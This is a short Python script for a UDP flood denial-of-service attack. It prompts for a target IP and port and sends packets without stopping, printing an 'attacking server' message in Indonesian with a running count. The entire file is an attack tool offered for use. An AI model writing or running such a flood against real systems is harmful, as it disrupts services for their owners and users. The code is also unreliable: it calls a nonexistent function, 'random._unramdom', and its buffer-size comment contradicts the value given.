import socket, random

ip = str(input("IP Target: "))
port = int(input("Port: "))

buffer = random._unramdom(20000) #2mb
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
count = int(0)
while True:
    count += 1
    s.sendto(buffer, (ip,port))
    print(f"Menyerang Server {ip}:{port}|Jumlah: {count}")